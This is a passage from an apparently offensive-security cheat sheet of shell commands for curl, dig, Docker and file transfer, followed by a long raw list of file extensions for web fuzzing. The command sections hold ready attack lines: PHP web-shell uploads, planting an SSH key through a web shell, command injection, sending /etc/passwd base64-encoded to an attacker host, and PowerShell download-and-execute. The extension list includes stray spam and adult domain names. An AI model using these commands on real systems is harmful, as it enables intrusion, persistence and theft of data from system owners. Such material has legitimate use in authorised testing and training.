$ curl -s "http://<DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text    // silent mode and output conversion
$ curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
$ curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
```

### Reference for -X

> https://daniel.haxx.se/blog/2015/09/11/unnecessary-use-of-curl-x/

### Headers

```c
$ curl -vvv <RHOST>
```

or

```c
$ curl -s -q -v -H 'Origin: http://<RHOST>' <DOMAIN>/api/auth
```

### Use SSL

```c
$ curl -k <RHOST>
```

### Use Proxy

```c
$ curl --proxy http://127.0.0.1:8080
```

### Web Shell Upload

```c
$ curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://<RHOST>/PATH/TO/DIRECTORY/<FILE>.php
$ curl -X PUT -T /usr/share/webshells/aspx/cmdasp.aspx "http://<RHOST>/sh.aspx"
$ curl -X MOVE -H "Destination: http://<RHOST>/sh.aspx" http://<RHOST>/sh.txt
```

### SSH Key Upload

```c
$ curl -G 'http://<RHOST>/<WEBSHELL>.php' --data-urlencode 'cmd=echo ssh-rsa AAAA--- snip --- 5syQ > /home/<USERNAME>/.ssh/authorized_keys'
```

### Command Injection

```c
$ curl -X POST http://<RHOST>/select --data 'db=whatever|id'
```

### File upload from local Web Server to Remote System

```c
$ curl http://<LHOST>/nc.exe -o c:\users\<USERNAME>\nc.exe
```

### File Download via Command Injection

```c
$ curl --silent -X POST http://<RHOST>/select --data 'db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem' | grep -zo '\-\-.*\-\-' > intermediate.cert.pem
```

### Get Server Time

```c
$ curl --head http://<RHOST>/
```

### curl Injection with Burp Suite

```c
-o /var/www/html/uploads/shell.php http://<LHOST>/shell.php
```

## dig

### Banner Grabbing

```c
$ dig version.bind CHAOS TXT @<RHOST>
$ dig ANY @<RHOST> <DOMAIN>
$ dig A @<RHOST> <DOMAIN>
$ dig AAAA @<RHOST> <DOMAIN>
$ dig TXT @<RHOST> <DOMAIN>
$ dig MX @<RHOST> <DOMAIN>
$ dig NS @<RHOST> <DOMAIN>
$ dig -x <RHOST> @<RHOST>
```

### Zone Transfer

```c
$ dig axfr @<RHOST>
$ dig axfr @<RHOST> <DOMAIN>
```

### Dir

```c
C:\> dir flag* /s /p
C:\> dir /s /b *.log
```

## Docker

### Starting Container and mount Directory on Host

```c
$ docker run -it -v $(pwd):/app <CONTAINER>
```

#### Gopherus Example

```
$ cd /opt/Gopherus
$ sudo docker run -v $(pwd):/Gopherus -it --rm --name Gopherus python:2.7.18-buster bash
$ cd /Gopherus
$ ./install.sh
```

## dos2unix

```c
$ dos2unix <FILE>.sh
```

## dpkg

### Files which changed in the last 2 Minutes

```c
$ dpkg -V 2>/dev/null
```

## echo

### Remove "\n"

```c
$ echo -e "string\n" > <FILE>
```

## egrep

### Search for IPv6 Addresses

```c
$ egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'
```

## Environment Variables

```c
$ env
$ echo $PATH
```

### Export Path

```c
$ echo $PATH
$ export PATH=`pwd`:$PATH
```

## faketime

```c
$ faketime 'last friday 5 pm' /bin/date
$ faketime '2008-12-24 08:15:42' /bin/date
$ faketime -f '+2,5y x10,0' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
$ faketime -f '+2,5y x0,50' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
$ faketime -f '+2,5y i2,0' /bin/bash -c 'date; while true; do date; sleep 1 ; done'
```

### Proxychains and Kerberos

```c
$ proxychains faketime -f +1h kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
```

## fg

```c
$ fg
```

## file

```c
$ file <file>
```

## File Transfer

> https://gtfobins.github.io/#+file%20upload

### Bash File Transfer

#### To the Target

```c
$ bash -c "cat < /dev/tcp/<RHOST>/<RPORT> > <FILE>"
$ nc -lnvp <LPORT> < <FILE>
```

#### From the Target

```c
$ bash -c "cat < <FILE> > /dev/tcp/<RHOST>/<RPORT>" 
$ nc -lnvp <LPORT> > <FILE>
```

### cancel

```c
$ nc -nlvp 18110
$ cancel -u "$(cat /etc/passwd | base64)" -h <LHOST>:<LPORT>
```

### rlogin

```c
$ rlogin -l "$(cat /etc/passwd | base64)" -p <LPORT> <LHOST>
```

### SMB Access via PowerShell

```c
$ sudo python3 impacket/examples/smbserver.py <SHARE> ./
```

or

```c
$ sudo impacket-smbserver <SHARE> . -smb2support
```

### Linux to Windows

```c
PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<LOCAL_DIRECTORY>/<FILE>','C:\Users\<USERNAME>\Documents\<FILE>')"
```

### Windows to Linux

```c
C:\> copy * \\<LHOST>\<SHARE>
```

### Windows to Linux using Invoke-Webrequest

```c
PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

#### Short Version

```c
PS C:\> iwr <LHOST>/<FILE> -o <FILE>
PS C:\> iwr <LHOST>/<FILE> -o <FILE> -useb
PS C:\> iwr <LHOST>/<FILE> -o <FILE> -UseBasicParsing
PS C:\> IEX(IWR http://<LHOST>/<FILE>)
PS C:\> IEX(IWR http://<LHOST>/<FILE>) -useb
PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
```

### FTP Server

```c
$ sudo msfconsole
msf6 > use auxiliary/server/ftp
msf6 auxiliary(server/ftp) > set FTPROOT /home/kali/htb/machines/sauna/serve/
FTPROOT => /home/kali/htb/machines/sauna/serve/
msf6 auxiliary(server/ftp) > exploit
[*] Auxiliary module running as background job 0.
```

## Filetypes

```c
.php
.html
.txt
.htm
.aspx
.asp
.js
.css
.pgsql.txt
.mysql.txt
.pdf
.cgi
.inc
.gif
.jpg
.swf
.xml
.cfm
.xhtml
.wmv
.zip
.axd
.gz
.png
.doc
.shtml
.jsp
.ico
.exe
.csi
.inc.php
.config
.jpeg
.ashx
.log
.xls
.0
.old
.mp3
.com
.tar
.ini
.asa
.tgz
.PDF
.flv
.php3
.bak
.rar
.asmx
.xlsx
.page
.phtml
.dll
.JPG
.asax
.1
.msg
.pl
.GIF
.ZIP
.csv
.css.aspx
.2
.JPEG
.3
.ppt
.nsf
.Pdf
.Gif
.bmp
.sql
.Jpeg
.Jpg
.xml.gz
.Zip
.new
.avi
.psd
.rss
.5
.wav
.action
.db
.dat
.do
.xsl
.class
.mdb
.include
.12
.cs
.class.php
.htc
.mov
.tpl
.4
.6.12
.9
.js.php
.mysql-connect
.mpg
.rdf
.rtf
.6
.ascx
.mvc
.1.0
.files
.master
.jar
.vb
.mp4
.local.php
.fla
.require
.de
.docx
.php5
.wci
.readme
.7
.cfg
.aspx.cs
.cfc
.dwt
.ru
.LCK
.Config
.gif_var_DE
.html_var_DE
.net
.ttf
.HTM
.X-AOM
.jhtml
.mpeg
.ASP
.LOG
.X-FANCYCAT
.php4
.readme_var_DE
.vcf
.X-RMA
.X-AFFILIATE
.X-OFFERS
.X-AFFILIATE_var_DE
.X-AOM_var_DE
.X-FANCYCAT_var_DE
.X-FCOMP
.X-FCOMP_var_DE
.X-GIFTREG
.X-GIFTREG_var_DE
.X-MAGNIFIER
.X-MAGNIFIER_var_DE
.X-OFFERS_var_DE
.X-PCONF
.X-PCONF_var_DE
.X-RMA_var_DE
.X-SURVEY
.tif
.dir
.json
.6.9
.Zif
.wma
.8
.mid
.rm
.aspx.vb
.tar.gz
.woa
.main
.ram
.opml
.0.html
.css.php
.feed
.lasso
.6.3
.shtm
.sitemap
.scc
.tmp
.backup
.sln
.org
.conf
.mysql-query
.session-start
.uk
.10
.14
.TXT
.orig
.settings.php
.19
.cab
.kml
.lck
.pps
.require-once
.asx
.bok
.msi
.01
.c
.fcgi
.fopen
.html.
.phpmailer.php
.bin
.htaccess
.info
.java
.jsf
.tmpl
.0.2
.00
.6.19
.DOC
.bat
.com.html
.print
.resx
.ics
.php.php
.x
.PNG
.data
.dcr
.enfinity
.html.html
.licx
.mno
.plx
.vm
.11
.5.php
.50
.HTML
.MP3
.config.php
.dwg
.edu
.search
.static
.wws
.6.edu
.OLD
.bz2
.co.uk
.ece
.epc
.getimagesize
.ice
.it_Backup_Giornaliero
.it_Backup_Settimanale
.jspa
.lst
.php-dist
.svc
.vbs
.1.html
.30-i486
.ai
.cur
.dmg
.img
.inf
.seam
.smtp.php
.1-bin-Linux-2.0.30-i486
.1a
.34
.5.3
.7z
.ajax
.cfm.cfm
.chm
.csp
.edit
.file
.gif.php
.m3u
.psp
.py
.sh
.test
.zdat
.04
.2.2
.4.0
.admin
.captcha.aspx
.dev
.eps
.file-get-contents
.fr
.fsockopen
.list
.m4v
.min.js
.new.html
.p
.store
.webinfo
.xml.php
.3.2
.5.0
.BAK
.htm.
.php.bak
.1.1
.1c
.300
.5.1
.790
.826
.bk
.bsp
.cms
.csshandler.ashx
.d
.html,
.htmll
.idx
.images
.jad
.master.cs
.prev_next
.ssf
.stm
.txt.gz
.00.8169
.01.4511
.112
.134
.156
.2.0
.21
.24
.4.9.php
.4511
.8169
.969
.Web.UI.WebResource.axd
.as
.asp.asp
.au
.cnf
.dhtml
.enu
.html.old
.include-once
.lock
.m
.mysql-select-db
.phps
.pm
.pptx
.sav
.sendtoafriendform
.ssi
.suo
.vbproj
.wml
.xsd
.025
.075
.077
.083
.13
.16
.206
.211
.246
.26.13.391N35.50.38.816
.26.24.165N35.50.24.134
.26.56.247N35.52.03.605
.27.02.940N35.49.56.075
.27.15.919N35.52.04.300
.27.29.262N35.47.15.083
.367
.3gp
.40.00.573N35.42.57.445
.403
.43.58.040N35.38.35.826
.44.04.344N35.38.35.077
.44.08.714N35.39.08.499
.44.10.892N35.38.49.246
.44.27.243N35.41.29.367
.44.29.976N35.37.51.790
.44.32.445N35.36.10.206
.44.34.800N35.38.08.156
.44.37.128N35.40.54.403
.44.40.556N35.40.53.025
.44.45.013N35.38.36.211
.44.46.104N35.38.22.970
.44.48.130N35.38.25.969
.44.52.162N35.38.50.456
.44.58.315N35.38.53.455
.445
.45.01.562N35.38.38.778
.45.04.359N35.38.39.112
.45.06.789N35.38.22.556
.45.10.717N35.38.41.989
.455
.456
.499
.556
.605
.778
.816
.970
.989
.ASPX
.JS
.PHP
.array-keys
.atom
.award
.bkp
.crt
.default
.eml
.epl
.fancybox
.fil
.geo
.h
.hmtl
.html.bak
.ida
.implode
.index.php
.iso
.kmz
.mysql-pconnect
.php.old
.php.txt
.rec
.storefront
.taf
.war
.xslt
.1.6
.15
.23
.2a
.8.1
.CSS
.NSF
.Sponsors
.a
.aquery
.ascx.cs
.cat
.contrib
.ds
.dwf
.film
.g
.go
.googlebook
.gpx
.hotelName
.htm.htm
.ihtml
.in-array
.index
.ini.php
.layer
.maninfo
.odt
.price
.randomhouse
.read
.ru-tov.html
.s7
.sample
.sit
.src
.tpl.php
.trck
.uguide
.vorteil
.wbp
.2.1
.2.html
.3.1
.30
.AVI
.Asp
.EXE
.WMV
.asax.vb
.aspx.aspx
.btr
.cer
.common.php
.de.html
.html‎
.jbf
.lbi
.lib.php
.lnk
.login
.login.php
.mhtml
.mpl
.mso
.mysql-result
.original
.pgp
.ph
.php.
.preview
.preview-content.php
.search.htm
.site
.text
.view
.0.1
.0.5
.1.2
.2.9
.3.5
.3.html
.4.html
.5.html
.72
.ICO
.Web
.XLS
.action2
.asc
.asp.bak
.aspx.resx
.browse
.code
.com_Backup_Giornaliero
.com_Backup_Settimanale
.csproj
.dtd
.en.html
.ep
.eu
.form
.html1
.inc.asp
.index.html
.it
.nl
.ogg
.old.php
.old2
.opendir
.out
.pgt
.php,
.php‎
.po
.prt
.query
.rb
.rhtml
.ru.html
.save
.search.php
.t
.wsdl
.0-to1.2.php
.0.3
.03
.18
.2.6
.3.0
.3.4
.4.1
.6.1
.7.2
.CFM
.MOV
.MPEG
.Master
.PPT
.TTF
.Templates
.XML
.adp
.ajax.php
.apsx
.asf
.bck
.bu
.calendar
.captcha
.cart
.com.crt
.core
.dict.php
.dot
.egov
.en.php
.eot
.errors
.f4v
.fr.html
.git
.ht
.hta
.html.LCK
.html.printable
.ini.sample
.lib
.lic
.map
.master.vb
.mi
.mkdir
.o
.p7b
.pac
.parse.errors
.pd
.pfx
.php2
.php_files
.phtm
.png.php
.portal
.printable
.psql
.pub
.q
.ra
.reg
.restrictor.php
.rpm
.strpos
.tcl
.template
.tiff
.tv
.us
.user
.06
.09
.1.3
.1.5.swf
.2.3
.25
.3.3
.4.2
.6.5
.Controls
.WAV
.acgi
.alt
.array-merge
.back
.call-user-func-array
.cfml
.cmd
.cocomore.txt
.detail
.disabled
.dist.php
.djvu
.dta
.e
.extract
.file-put-contents
.fpl
.framework
.fread
.htm.LCK
.inc.js
.includes
.jp
.jpg.html
.l
.letter
.local
.num
.pem
.php.sample
.php}
.php~
.pot
.preg-match
.process
.ps
.r
.raw
.rc
.s
.search.
.server
.sis
.sql.gz
.squery
.subscribe
.svg
.svn
.thtml
.tpl.html
.ua
.vcs
.xhtm
.xml.asp
.xpi
.0.0
.0.4
.07
.08
.10.html
.17
.2008
.2011
.22
.25.html
.2ms2
.3.2.min.js
.32
.33
.4.6
.5.6
.6.0
.7.1
.91
.A
.PAGE
.SWF
.add
.array-rand
.asax.cs
.asax.resx
.ascx.vb
.aspx,
.aspx.
.awm
.b
.bhtml
.bml
.ca
.cache
.cfg.php
.cn
.cz
.de.txt
.diff
.email
.en
.error
.faces
.filesize
.functions.php
.hml
.hqx
.html,404
.html.php
.htmls
.htx
.i
.idq
.jpe
.js.aspx
.js.gz
.jspf
.load
.media
.mp2
.mspx
.mv
.mysql
.new.php
.ocx
.oui
.outcontrol
.pad
.pages
.pdb
.pdf.
.pnp
.pop_formata_viewer
.popup.php
.popup.pop_formata_viewer
.pvk
.restrictor.log
.results
.run
.scripts
.sdb
.ser
.shop
.sitemap.xml
.smi
.start
.ste
.swf.swf
.templates
.textsearch
.torrent
.unsubscribe
.v
.vbproj.webinfo
.web
.wmf
.wpd
.ws
.xpml
.y
.0.8
.0.pdf
.001
.1-all-languages
.1.pdf
.11.html
.125
.20
.20.html
.2007
.26.html
.4.7
.45
.5.4
.6.2
.6.html
.7.0
.7.3
.7.html
.75.html
.8.2
.8.3
.AdCode
.Aspx
.C.
.COM
.GetMapImage
.Html
.Run.AdCode
.Skins
.Z
.access.login
.ajax.asp
.app
.asd
.asm
.assets
.at
.bad
.bak2
.blog
.casino
.cc
.cdr
.changeLang.php
.children
.com,
.com-redirect
.content
.copy
.count
.cp
.csproj.user
.custom
.dbf
.deb
.delete
.details.php
.dic
.divx
.download
.download.php
.downloadCirRequirements.pdf
.downloadTourkitRequirements.pdf
.emailCirRequirements.php
.emailTourkitForm.php
.emailTourkitNotification.php
.emailTourkitRequirements.php
.epub
.err
.es
.exclude
.filemtime
.fillPurposes2.php
.grp
.home
.htlm
.htm,
.html-
.image
.inc.html
.it.html
.j
.jnlp
.js.asp
.js2
.jspx
.lang-en.php
.link
.listevents
.log.0
.mbox
.mc_id
.menu.php
.mgi
.mod
.net.html
.news
.none
.off
.p3p
.php.htm
.php.static
.php1
.phpp
.pop3.php
.pop_3D_viewer
.popup.pop_3D_viewer
.prep
.prg
.print.html
.print.php
.product_details
.pwd
.pyc
.red
.registration
.requirementsFeesTable.php
.roshani-gunewardene.com
.se
.sea
.sema
.session
.setup
.simplexml-load-file
.sitx
.smil
.srv
.swi
.swp
.sxw
.tar.bz2
.tem
.temp
.template.php
.top
.txt.php
.types
.unlink
.url
.userLoginPopup.php
.visaPopup.php
.visaPopupValid.php
.vspscc
.vssscc
.w
.work
.wvx
.xspf
.-
.-110,-maria-lund-45906.-511-gl.php
.-tillagg-order-85497.php
.0-rc1
.0.10
.0.11
.0.328.1.php
.0.329.1.php
.0.330.1.php
.0.6
.0.7
.0.806.1.php
.0.xml
.0.zip
.000
.002
.02
.030-i486
.05
.07.html
.1-3.2.php
.1-bin-Linux-2.030-i486
.1-pt_BR
.1.5
.1.8
.1.htm
.10.10
.11.2010
.12.html
.13.html
.131
.132
.15.html
.16.html
.2-rc1
.2.5
.2.8
.2.js
.2.pdf
.2004
.2006
.2009
.2010
.21.html
.23.html
.26
.27
.27.html
.29.html
.31
.35
.4.2.min.js
.4.4
.45.html
.5.1-pt_BR
.5.2
.5.7
.5.7-pl1
.6-all-languages
.6.14
.6.16
.6.18
.6.2-rc1
.62.html
.63.html
.64
.65
.66
.7-pl1
.762
.8.2.4
.8.5
.8.7
.80.html
.808
.85
.9.1
.90
.92
.972
.98.html
.Admin
.E.
.Engineer
.INC
.LOG.new
.MAXIMIZE
.MPG
.NDM
.Php
.R
.SIM
.SQL
.Services
.[file
.accdb
.act
.actions.php
.admin.php
.ads
.alhtm
.all
.ani
.apf
.apj
.ar
.aral-design.com
.aral-design.de
.arc
.array-key-exists
.asp.old
.asp1
.aspg
.bfhtm
.biminifinder
.br
.browser
.build
.buscar
.categorias
.categories
.ccs
.ch
.cl
.click.php
.cls
.cls.php
.cms.ad.AdServer.cls
.com-tov.html
.com.ar
.com.br
.com.htm
.com.old
.common
.conf.php
.contact.php
.control
.core.php
.counter.php
.coverfinder
.create.php
.cs2
.d2w
.dbm
.dct
.dmb
.doc.doc
.dxf
.ed
.email.shtml
.en.htm
.engine
.env
.error-log
.esp
.ex
.exc
.exe,
.ext
.external
.ficheros
.fichiers
.flush
.fmt
.fn
.footer
.form_jhtml
.friend
.g.
.geo.xml
.ghtml
.google.com
.gov
.gpg
.hl
.href
.htm.d
.htm.html
.htm.old
.htm2
.html.orig
.html.sav
.html[
.html]
.html_
.html_files
.htmlpar
.htmlprint
.html}
.htm~
.hts
.hu
.hwp
.ibf
.il
.image.php
.imagecreatetruecolor
.imagejpeg
.iml
.imprimer
.imprimer-cadre
.imprimir
.imprimir-marco
.info.html
.info.php
.ini.bak
.ini.default
.inl
.inv
.join
.jpg.jpg
.jps
.key
.kit
.lang
.lignee
.ltr
.lzh
.m4a
.mail
.manager
.md5
.met
.metadesc
.metakeys
.mht
.min
.mld
.mobi
.mobile
.mv4
.n
.net-tov.html
.nfo
.nikon
.nodos
.nxg
.obyx
.ods
.old.2
.old.asp
.old.html
.open
.opml.config
.ord
.org.zip
.ori
.partfinder
.pho
.php-
.phpl
.phpx
.pix
.pls
.prc
.pre
.prhtm
.print-frame
.print.
.print.shtml
.printer
.properties
.propfinder
.pvx
.p​hp
.recherche
.redirect
.req
.roshani-gunewardene.net
.roshani-m-gunewardene.com
.safe
.sbk
.se.php
.search.asp
.sec
.seo
.serv
.server.php
.servlet
.settings
.sf
.shopping_return.php
.shopping_return_adsense.php
.show
.sht
.skins
.so
.sph
.split
.sso
.stats.php
.story
.swd
.swf.html
.sys
.tex
.tga
.thm
.tlp
.tml
.tmp.php
.touch
.tsv
.txt.
.txt.html
.ug
.unternehmen
.utf8
.vbproj.vspscc
.vsprintf
.vstemplate
.vtl
.wbmp
.webc
.webproj
.wihtm
.wp
.wps
.wri
.wsc
.www
.xsp
.xsql
.zip,
.zml
.ztml
. EXTRAHOTELERO HOSPEDAJE
. T.
. php
.,
.-0.html
.-bouncing
.-safety-fear
.0--DUP.htm
.0-0-0.html
.0-2.html
.0-4.html
.0-features-print.htm
.0-pl1
.0-to-1.2.php
.0.0.0
.0.1.1
.0.10.html
.0.11-pr1
.0.15
.0.35
.0.8.html
.0.jpg
.00.html
.001.L.jpg
.002.L.jpg
.003.L.jpg
.003.jpg
.004.L.jpg
.004.jpg
.006
.006.L.jpg
.01-10
.01-L.jpg
.01.html
.01.jpg
.011
.017
.02.html
.03.html
.04.html
.041
.05.09
.05.html
.052
.06.html
.062007
.070425
.08-2009
.08.2010.php
.08.html
.09.html
.0b
.1-en
.1-english
.1-rc1
.1.0.html
.1.10
.1.2.1
.1.24-print.htm
.1.9498
.1.php
.1.x
.10.1
.10.11
.10.2010
.10.5
.100.html
.1008
.105
.1052
.10a
.11-pr1
.11.5-all-languages-utf-8-only
.11.6-all-languages
.110607
.1132
.12.pdf
.125.html
.1274
.12D6
.12EA
.133
.139
.13BA
.13F8
.14.05
.14.html
.1478
.150.html
.1514
.15462.articlePk
.15467.articlePk
.15F4
.160
.161E
.16BE
.1726
.175
.17CC
.18.html
.180
.1808
.1810
.1832
.185
.18A
.19.html
.191E
.1958
.1994
.199C
.1ADE
.1C2E
.1C50
.1CD6
.1D8C
.1E0
.1_stable
.2-english
.2.0.html
.2.00
.2.2.html
.2.2.pack.js
.2.6.min.js
.2.6.pack.js
.2.7
.2.php
.2.swf
.2.tmp
.2.zip
.200.html
.2004.html
.2005
.2009.pdf
.202
.205.html
.20A6
.22.html
.220
.24.html
.246.224.125
.24stable
.25.04
.25CE
.2769
.28.html
.2808
.29
.2ABE
.2B26
.2CC
.2CD0
.2D1A
.2DE
.2E4
.2E98
.2EE2
.2b
.3-pl1
.3-rc1
.3.2a
.3.6
.3.7-english
.3.asp
.3.php
.30.html
.308E
.31.html
.330
.3374
.33E0
.346A
.347A
.347C
.3500
.3590
.35B8
.36
.37
.37.0.html
.37C2
.3850
.3EA
.3F54
.4-all-languages
.4.10a
.4.14
.4.3
.4.5
.40.html
.4040
.414
.41A2
.4234
.42BA
.43
.43CA
.43FA
.4522
.4556
.464
.46A2
.46D4
.47F6
.482623
.4884
.490
.497C
.4A4
.4A84
.4B88
.4C6
.4CC
.4D3C
.4D6C
.4FB8
.5-all-languages-utf-8-only
.5-pl1
.5.1.html
.5.5-pl1
.5.i
.50.html
.508
.50A
.51
.5214
.55.html
.574
.576
.5B0
.5E0
.5E5E
.5_mod_for_host
.6.0-pl1
.6.3-pl1
.6.3-rc1
.6.4
.608
.61.html
.63
.65.html
.65E
.67E
.698
.69A
.6A0
.6CE
.6D2
.6D6
.6DA
.6EE
.6F8
.6FA
.6FC
.7-2.html
.7-english
.7.2.custom
.7.5
.7.js
.710
.71E
.71a
.732
.73C
.776
.77C
.7878
.78A
.792
.79C
.7AB6
.7AE
.7AF8
.7B0
.7B30
.7B5E
.7C6
.7C8
.7CA
.7CC
.7D6
.7E6
.7F0
.7F4
.7FA
.7FE
.7_0_A
.8.0
.8.0.html
.8.23
.8.4
.8.html
.802
.80A
.80E
.824
.830
.832
.836
.84
.84.119.131
.842
.84CA
.84E
.854
.856
.858
.860
.862
.866
.878
.87C
.888luck.asia
.88C
.8990
.89E
.8AE
.8B0
.8C6
.8D68
.8DC
.8E6
.8EC
.8EE
.8a
.9.2
.9.6.2
.9.html
.90.3
.90.html
.918
.924
.94
.9498
.95
.95.html
.964
.97C
.984
.99
.99E
.9A6
.9C
.9CEE
.9D2
.A.
.A00
.A02
.A22
.A34
.A40
.A4A
.A50
.A58
.A5CA
.A8A
.AB60
.AC0
.AC2
.ACA2
.AE2
.AEFA
.AF54
.AF90
.ALT
.ASC.
.Acquisition
.Appraisal
.B04
.B18
.B1C
.B2C
.B38
.B50
.B5E
.B70
.B7A
.B8A
.BBC
.BD0
.BMP
.C.R.D.
.C38
.C44
.C50
.C68
.C72
.C78
.C7C
.C84
.CAA
.CAB
.CB8
.CBC
.CC0
.CF4
.CF6
.CGI
.Cfm
.Commerce
.CorelProject
.Css
.D.
.D.R.
.D20
.D7A
.DBF
.DC2
.DESC.
.DLL
.DOCX
.Direct
.DnnWebService
.Doc
.E46
.E96
.EA0
.EBA
.EC0
.EDE
.EEA
.EF8
.Email
.Eus
.F22
.F46
.F54
.FAE
.FRK
.H.I.
.INFO
.INI
.ISO
.Includes
.K.E.
.K.T.
.KB
.L.
.L.jpg
.LassoApp
.MLD
.Main
.NET
.NEWCONFIGPOSSIBLYBROKEN
.Old
.Org.master
.Org.master.cs
.Org.sln
.Org.vssscc
.P.
.PSD
.Publish
.RAW
.S
.SideMenu
.Sol.BBCRedirection.page
.Superindian.com
.T.A
.T.A.
.TEST
.Tung.php
.WTC
.XMLHTTP
.Xml
._._order
._heder.yes.html
._order
.a.html
.a5w
.aac
.access
.act.php
.action.php
.actions
.activate.php
.ad.php
.add.php
.adenaw.com
.adm
.advsearch
.ag.php
.aj_
.all.hawaii
.amaphun.com
.andriy.lviv.ua
.ap
.api
.apk
.application
.archiv
.arj
.array-map
.array-values
.art
.artdeco
.articlePk
.artnet.
.ascx.resx
.asia
.asp-
.asp.LCK
.asp.html
.asp2
.aspDONOTUSE
.asp_
.asp_files
.aspl
.aspp
.asps
.aspx.designer.cs
.aspx_files
.aspxx
.aspy
.asxp
.as​p
.at.html
.avatar.php
.awstats
.a​sp
.babymhiasexy.com
.backup.php
.bak.php
.banan.se
.banner.php
.barnes
.basicmap.php
.baut
.bc
.best-vpn.com
.beta
.biz
.blackandmature.com
.bmp.php
.board.asd
.boom
.bossspy.org
.buscadorpornoxxx.com
.buy-here.com
.buyadspace
.bycategory
.bylocation
.bz
.c.html
.cache.inc.php
.cache.php
.car
.cascinaamalia.it
.cat.php
.catalog
.cdf
.ce
.cfm.bak
.cfsifatest.co.uk
.cfstest.co.uk
.cfswf
.cfx
.cgis
.chat
.chdir
.chloesworld.com
.classes.php
.cmp
.cnt
.co
.co-operativebank.co.uk
.co-operativebanktest.co.uk
.co-operativeinsurance.co.uk
.co-operativeinsurancetest.co.uk
.co-operativeinvestmentstest.co.uk
.co.il
.colorbox-min.js
.com-authorization-required.html
.com-bad-request.html
.com-forbidden.html
.com-internal-server-error.html
.com-page-not-found.html
.com.au
.com.php
.com.ua
.com_Backup_
.com_files
.comments
.comments.
.comments.php
.compiler.php
.conf.html
.confirm.email
.connect.php
.console
.contact
.content.php
.controller
.controls-3.1.5.swf
.cookie.js
.corp
.corp.footer
.cqs
.cron
.cropcanvas.php
.cropinterface.php
.crx
.csproj.webinfo
.csr
.css.LCK
.css.gz
.cssd
.csv.php
.ctp
.cx
.cycle.all.min.js
.d64
.daisy
.dal
.daniel
.daniel-sebald.de
.data.php
.data_
.davis
.dbml
.dcf
.de.jsp
.default.php
.del
.deleted
.dell
.demo
.desarrollo.aquihaydominios.com
.dev.bka.co.nz
.development
.dig
.display.php
.dist
.dk
.dm
.dmca-sucks.com
.dms
.dnn
.dogpl
.donothiredandobrin.com
.dontcopy
.downloadfreeporn.asia
.du
.dump
.dws
.dyn
.ea3ny.com
.easing.min.js
.ebay
.ebay.results.html
.editingoffice.com
.efacil.com.br
.ehtml
.emaximinternational.com
.en.jsp
.enn
.equonix.com
.es.html
.es.jsp
.euforyou.net
.eur
.excel.xml.php
.exec
.exp
.f.l.
.faucetdepot
.faucetdepot.com.vbproj
.faucetdepot.com.vbproj.webinfo
.fb2
.fdml
.feeds.php
.ffa
.ficken.cx
.filereader
.filters.php
.flac
.flypage
.fon
.forget.pass
.form.php
.forms
.forum
.found
.fp7
.fr.jsp
.freeasianporn.asia
.freepornxxx.asia
.frk
.frontpage.php
.ft
.ftl
.fucks.nl
.funzz.fr
.gallery.php
.garcia
.gb
.get
.get-meta-tags
.gif         
.gif.count
.girlvandiesuburbs.co.za
.gitihost.com
.glasner.ru
.google
.gray
.gsp
.guiaweb.tk
.gutschein
.guy
.ha
.hardestlist.com
.hardpussy.com
.hasrett.de
.hawaii
.header.php
.henry
.him
.history
.hlr
.hm
.ho
.hokkaido
.hold
.home.php
.home.test
.homepage
.hp
.htm.bak
.htm.rc
.htm3
.htm5
.htm7
.htm8
.htm_
.html,,
.html-0
.html-1
.html-c
.html-old
.html-p
.html.htm
.html.images
.html.inc
.html.none
.html.pdf
.html.start
.html.txt
.html4
.html5
.html7
.htmlBAK
.htmlDolmetschen
.html_old
.htmla
.htmlc
.htmlfeed
.htmlq
.htmlu
.htn
.htpasswd
.h​tml
.iac.
.ibuysss.info
.iconv
.idf
.iframe_filtros
.ignore.php
.ihmtl
.ihya
.imp
.in
.inactive
.inc.php.bak
.inc.php3
.incest-porn.sex-startje.nl
.incestporn.sex-startje.nl
.incl
.indiansexzite.com
.indt
.ini.NEWCONFIGPOSSIBLYBROKEN
.insert
.internet-taxprep.com
.interpreterukraine.com
.ipl
.issues
.itml
.ixi
.jhtm
.job
.joseph
.jpf
.jpg.xml
.jpg[
.jpg]
.js,
.js.LCK
.jsa
.jsd
.jso
.jsp.old
.jsps
.jtp
.keyword
.kinkywear.net
.kk
.knvbcommunicator.voetbalassist.nl
.kokuken
.ks
.kutxa.net-en
.lang-de.php
.lang.php
.langhampartners.com
.lappgroup.com
.last
.latest
.lha
.links
.list.includes
.listMiniGrid
.listing
.lng
.loc
.local.cfm
.location.href
.log2
.lua
.lynkx
.maastrichtairporthotels.com
.mag
.mail.php
.malesextoys.us
.massivewankers.com
.mbizgroup
.mel
.members
